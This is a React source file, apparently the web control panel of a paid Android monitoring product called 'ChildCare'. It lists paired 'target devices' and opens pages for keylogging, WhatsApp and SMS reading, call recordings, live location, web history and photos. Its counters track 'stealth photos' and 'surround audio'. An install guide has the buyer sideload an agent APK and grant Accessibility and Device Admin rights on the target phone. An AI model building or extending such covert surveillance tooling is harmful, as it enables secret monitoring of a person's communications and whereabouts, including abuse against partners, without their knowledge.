import React, { useState, useEffect } from 'react';
import { MainLayout } from './layouts/MainLayout';
import { DashboardOverviewPage } from './pages/DashboardOverviewPage';
import { WhatsAppPage } from './pages/WhatsAppPage';
import { ContactsPage } from './pages/ContactsPage';
import { MyDevicesPage } from './pages/MyDevicesPage';
import { CallsPage } from './pages/CallsPage';
import { CallRecordingsPage } from './pages/CallRecordingsPage';
import { SMSPage } from './pages/SMSPage';
import { KeyloggerPage } from './pages/KeyloggerPage';
import { LiveLocationPage } from './pages/LiveLocationPage';
import { InstalledAppsPage } from './pages/InstalledAppsPage';
import { AppUsagePage } from './pages/AppUsagePage';
import { CalendarPage } from './pages/CalendarPage';
import { WebHistoryPage } from './pages/WebHistoryPage';
import { PhotosPage } from './pages/PhotosPage';
import { LoginPage } from './pages/LoginPage';
import { BuyNowPage } from './pages/BuyNowPage';
import { NoLicenseModal } from './components/NoLicenseModal';
import { DeviceInfo, MetricSummary, ActivityEvent } from './types/dashboard.types';
import { apiService } from './services/apiService';
import { Smartphone, PlusCircle, ShoppingCart, AlertTriangle, ShieldAlert, Key, BookOpen, X } from 'lucide-react';

export default function App() {
  // Initialize auth state from localStorage to preserve session across page refreshes
  const [isAuthenticated, setIsAuthenticated] = useState<boolean>(() => {
    return !!localStorage.getItem('childcare_auth_token');
  });

  const [activeTab, setActiveTab] = useState<string>('dashboard');
  const [availableDevices, setAvailableDevices] = useState<DeviceInfo[]>([]);
  const [currentDevice, setCurrentDevice] = useState<DeviceInfo | null>(null);
  const [userLicenses, setUserLicenses] = useState<any[]>([]);
  const [showNoLicenseModal, setShowNoLicenseModal] = useState<boolean>(false);
  const [isLicenseExpired, setIsLicenseExpired] = useState<boolean>(false);
  const [showGuideModal, setShowGuideModal] = useState<boolean>(false);

  const handleLoginSuccess = (user: any) => {
    localStorage.setItem('childcare_auth_token', user?.token || 'true');
    setIsAuthenticated(true);
  };

  const handleLogout = () => {
    localStorage.removeItem('childcare_auth_token');
    setIsAuthenticated(false);
  };

  // Live polling for ChildCare Licenses & Paired Devices from NestJS PostgreSQL backend
  useEffect(() => {
    if (!isAuthenticated) return;

    let isMounted = true;
    const fetchAccountData = async () => {
      try {
        // 1. Fetch Parent ChildCare Licenses via Authenticated Authorization Header
        const licenses = await apiService.getLicenses([]);
        if (isMounted && Array.isArray(licenses)) {
          setUserLicenses(licenses);

          // Check if parent has no licenses or if active license is expired
          if (licenses.length === 0) {
            setShowNoLicenseModal(true);
          } else {
            const hasActiveOrUnassigned = licenses.some(l => {
              const notExpired = new Date(l.expiresAt).getTime() > Date.now();
              return (l.status === 'ACTIVE' || l.status === 'UNASSIGNED') && notExpired;
            });

            if (!hasActiveOrUnassigned) {
              setIsLicenseExpired(true);
            } else {
              setIsLicenseExpired(false);
              setShowNoLicenseModal(false);
            }
          }
        }

        // 2. Fetch Target Devices
        const liveDevices = await apiService.getDevices([]);
        if (isMounted && Array.isArray(liveDevices)) {
          if (liveDevices.length > 0) {
            const formatted: DeviceInfo[] = liveDevices.map(d => ({
              id: d.id,
              alias: d.alias || d.name || "Target Device",
              model: d.model || 'Android Device',
              manufacturer: d.manufacturer || 'Android',
              androidVersion: String(d.androidVersion || 14),
              imei: d.imei || '35910294810294X',
              simOperator: d.simOperator || 'Cellular',
              batteryLevel: d.batteryLevel ?? 85,
              isCharging: d.isCharging ?? false,
              isOnline: d.isOnline ?? true,
              lastConnected: 'Just now',
              appVersion: d.appVersion || '8.2.0 - 220',
              capabilities: d.capabilities || {
                accessibility: true,
                deviceOwner: true,
                gps: true,
                batteryExempt: true,
                twoWayRecording: true,
              }
            }));
            setAvailableDevices(formatted);
            if (!currentDevice) {
              setCurrentDevice(formatted[0]);
            }
          } else {
            setAvailableDevices([]);
            setCurrentDevice(null);
          }
        }
      } catch (err) {
        console.warn('Backend polling error:', err);
      }
    };

    fetchAccountData();
    const interval = setInterval(fetchAccountData, 8000);
    return () => {
      isMounted = false;
      clearInterval(interval);
    };
  }, [isAuthenticated]);

  const metrics: MetricSummary = {
    whatsappMessages: 0,
    whatsappCalls: 0,
    callRecordings: 0,
    smsLogs: 0,
    locationPoints: 0,
    surroundAudioCount: 0,
    stealthPhotos: 0,
    screenshots: 0,
    keylogsCount: 0,
    webHistoryCount: 0,
    blockedAppsCount: 0,
    contactsCount: 0
  };

  const activityEvents: ActivityEvent[] = [];

  if (!isAuthenticated) {
    return <LoginPage onLoginSuccess={handleLoginSuccess} />;
  }

  // Active Device Fallback Placeholder if no devices paired yet
  const activeDev: DeviceInfo = currentDevice || {
    id: 'no_device',
    alias: 'No Devices Paired',
    model: 'Pair a Device',
    manufacturer: 'ChildCare',
    androidVersion: '14',
    imei: 'N/A',
    simOperator: 'N/A',
    batteryLevel: 0,
    isCharging: false,
    isOnline: false,
    lastConnected: 'Never',
    appVersion: '8.2.0',
    capabilities: {
      accessibility: false,
      deviceOwner: false,
      gps: false,
      batteryExempt: false,
      twoWayRecording: false,
    }
  };

  const renderCurrentPage = () => {
    if (activeTab === 'buynow' || activeTab === 'billing') {
      return (
        <BuyNowPage
          onLicensePurchased={(key) => {
            console.log('License Purchased:', key);
            setIsLicenseExpired(false);
            setShowNoLicenseModal(false);
            setActiveTab('devices');
          }}
        />
      );
    }

    if (activeTab === 'devices') {
      return (
        <MyDevicesPage
          availableDevices={availableDevices}
          userLicenses={userLicenses}
          currentDevice={activeDev}
          onSelectDevice={(dev) => setCurrentDevice(dev)}
          onNavigateTab={(tabId) => setActiveTab(tabId)}
        />
      );
    }

    // License Expiration Block Screen
    if (isLicenseExpired) {
      return (
        <div className="bg-rose-50 border border-rose-200 rounded-3xl p-8 sm:p-12 text-center max-w-2xl mx-auto my-12 space-y-6 shadow-md">
          <div className="w-16 h-16 rounded-full bg-rose-100 text-rose-600 flex items-center justify-center mx-auto shadow-inner">
            <ShieldAlert className="w-8 h-8" />
          </div>
          <div className="space-y-2">
            <h2 className="text-2xl font-black text-rose-950">ChildCare Subscription Expired</h2>
            <p className="text-xs text-rose-700 max-w-md mx-auto leading-relaxed">
              Your parental monitoring license has expired. Telemetry stream, call recordings, and live GPS tracking are paused until subscription renewal.
            </p>
          </div>

          <button
            onClick={() => setActiveTab('buynow')}
            className="px-8 py-3.5 bg-rose-600 hover:bg-rose-700 text-white font-bold text-sm rounded-full shadow-lg shadow-rose-600/30 transition-all inline-flex items-center gap-2"
          >
            <ShoppingCart className="w-4 h-4" />
            <span>Renew Subscription License Now ➔</span>
          </button>
        </div>
      );
    }

    // When 0 target devices are paired, show onboarding screen without license keys
    if (availableDevices.length === 0) {
      return (
        <div className="space-y-6 max-w-2xl mx-auto my-10">
          <div className="bg-white rounded-3xl p-8 sm:p-10 text-center border border-slate-200 shadow-sm space-y-5">
            
            <div className="w-14 h-14 rounded-full bg-indigo-50 text-indigo-600 flex items-center justify-center mx-auto shadow-inner border border-indigo-100">
              <Smartphone className="w-7 h-7" />
            </div>

            <div className="space-y-1.5">
              <h2 className="text-xl font-bold text-slate-900">No Target Device Paired Yet</h2>
              <p className="text-xs text-slate-500 max-w-md mx-auto leading-relaxed">
                Log into the <strong>ChildCare Agent App</strong> on your child's Android phone with your parent credentials to select and activate your plan.
              </p>
            </div>

            <div className="flex flex-col sm:flex-row items-center justify-center gap-3 pt-3">
              <button 
                onClick={() => setShowGuideModal(true)}
                className="w-full sm:w-auto px-5 py-2.5 bg-indigo-600 hover:bg-indigo-700 text-white font-bold text-xs rounded-full shadow-xs transition-all inline-flex items-center justify-center gap-2"
              >
                <BookOpen className="w-4 h-4" />
                <span>View Installation Guide</span>
              </button>

              <button 
                onClick={() => setActiveTab('devices')}
                className="w-full sm:w-auto px-5 py-2.5 bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold text-xs rounded-full transition-all inline-flex items-center justify-center gap-2"
              >
                <Key className="w-4 h-4" />
                <span>View Purchased Licenses</span>
              </button>
            </div>
          </div>

          {/* Installation Guide Modal */}
          {showGuideModal && (
            <div className="fixed inset-0 z-50 bg-slate-950/70 backdrop-blur-xs flex items-center justify-center p-4">
              <div className="bg-white rounded-3xl max-w-md w-full p-6 shadow-2xl space-y-4 border border-slate-100 relative">
                <button
                  onClick={() => setShowGuideModal(false)}
                  className="absolute top-4 right-4 p-1.5 text-slate-400 hover:text-slate-600 rounded-full"
                >
                  <X className="w-4 h-4" />
                </button>

                <div className="flex items-center gap-3 border-b border-slate-100 pb-3">
                  <div className="w-9 h-9 rounded-full bg-indigo-50 text-indigo-600 flex items-center justify-center shrink-0">
                    <BookOpen className="w-4 h-4" />
                  </div>
                  <div>
                    <h3 className="font-bold text-sm text-slate-900">ChildCare Installation Guide</h3>
                    <p className="text-[11px] text-slate-500">Target Android Device Onboarding</p>
                  </div>
                </div>

                <div className="space-y-2.5 text-xs text-slate-600 font-medium">
                  <div className="p-3 bg-slate-50 rounded-xl border border-slate-200/80 space-y-1">
                    <span className="font-bold text-slate-900 block text-xs">Step 1: Download Agent APK</span>
                    <p className="text-[11px] text-slate-500">Open browser on target phone and download ChildCare Agent installer.</p>
                  </div>

                  <div className="p-3 bg-slate-50 rounded-xl border border-slate-200/80 space-y-1">
                    <span className="font-bold text-slate-900 block text-xs">Step 2: Grant Permissions</span>
                    <p className="text-[11px] text-slate-500">Enable Accessibility, GPS Location, and Device Admin mode.</p>
                  </div>

                  <div className="p-3 bg-slate-50 rounded-xl border border-slate-200/80 space-y-1">
                    <span className="font-bold text-slate-900 block text-xs">Step 3: Login & Select License</span>
                    <p className="text-[11px] text-slate-500">Enter your parent Email & Password in the app ➔ Select your purchased license to activate.</p>
                  </div>
                </div>

                <div className="pt-2 flex justify-end">
                  <button
                    onClick={() => setShowGuideModal(false)}
                    className="px-4 py-2 rounded-full bg-indigo-600 hover:bg-indigo-700 text-white text-xs font-bold"
                  >
                    Got It
                  </button>
                </div>
              </div>
            </div>
          )}

        </div>
      );
    }

    switch (activeTab) {
      case 'photos':
      case 'gallery':
        return <PhotosPage device={activeDev} />;
      case 'webfilter':
      case 'internet-history':
        return <WebHistoryPage device={activeDev} />;
      case 'calendar':
        return <CalendarPage device={activeDev} />;
      case 'appusage':
        return <AppUsagePage device={activeDev} />;
      case 'appblock':
      case 'applications':
        return <InstalledAppsPage device={activeDev} />;
      case 'location':
        return <LiveLocationPage device={activeDev} />;
      case 'keylogger':
        return <KeyloggerPage device={activeDev} />;
      case 'recordings':
        return <CallRecordingsPage device={activeDev} />;
      case 'sms':
        return <SMSPage device={activeDev} />;
      case 'calls':
        return <CallsPage device={activeDev} />;
      case 'contacts':
        return <ContactsPage device={activeDev} />;
      case 'whatsapp':
        return <WhatsAppPage device={activeDev} />;
      case 'dashboard':
      default:
        return (
          <DashboardOverviewPage
            device={activeDev}
            metrics={metrics}
            activityEvents={activityEvents}
            onSelectFeature={(featureId) => setActiveTab(featureId)}
            onRefreshDevice={() => console.log('Refreshing device diagnostics...')}
          />
        );
    }
  };

  // Ensure modal NEVER displays while viewing the Buy Now checkout page
  const isViewingBuyNow = activeTab === 'buynow' || activeTab === 'billing';

  return (
    <MainLayout
      currentDevice={activeDev}
      availableDevices={availableDevices}
      onSelectDevice={(dev) => setCurrentDevice(dev)}
      activeTab={activeTab}
      onSelectTab={(tabId) => setActiveTab(tabId)}
      onLogout={handleLogout}
    >
      {/* License Expiration Banner Warning (hidden on Buy Now page) */}
      {isLicenseExpired && !isViewingBuyNow && (
        <div className="p-3.5 bg-rose-600 text-white font-bold text-xs rounded-2xl shadow-md flex items-center justify-between gap-3">
          <div className="flex items-center gap-2">
            <AlertTriangle className="w-4 h-4 shrink-0" />
            <span>Warning: Your ChildCare Subscription License has EXPIRED. Telemetry collection is paused.</span>
          </div>
          <button
            onClick={() => setActiveTab('buynow')}
            className="px-3.5 py-1.5 bg-white text-rose-700 hover:bg-rose-50 font-extrabold rounded-full transition-all shrink-0"
          >
            Renew Now ➔
          </button>
        </div>
      )}

      {/* No License Auto-Popup Modal (gated off on Buy Now page) */}
      <NoLicenseModal
        isOpen={showNoLicenseModal && !isViewingBuyNow}
        onClose={() => setShowNoLicenseModal(false)}
        onNavigateToBuyNow={() => setActiveTab('buynow')}
        onNavigateToPairing={() => setActiveTab('devices')}
      />

      {renderCurrentPage()}
    </MainLayout>
  );
}
